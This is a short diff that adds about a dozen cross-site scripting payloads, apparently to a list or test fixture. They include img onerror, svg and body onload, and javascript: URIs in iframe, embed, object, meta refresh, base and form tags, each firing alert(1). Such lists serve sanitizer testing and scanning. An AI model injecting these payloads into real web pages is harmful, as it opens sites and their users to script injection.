@@ -14,3 +14,15 @@ alert()
 <a href='javascript:alert(1)'>
 </a>
 <style>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<svg/onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<input type=text value=>
+<embed src=javascript:alert(1)>
+<object data=javascript:alert(1)>
+<meta http-equiv=refresh content=0;url=javascript:alert(1)>
+</style>
+<base href=javascript:alert(1)://>
+<form action=javascript:alert(1)>
+<input type=submit>
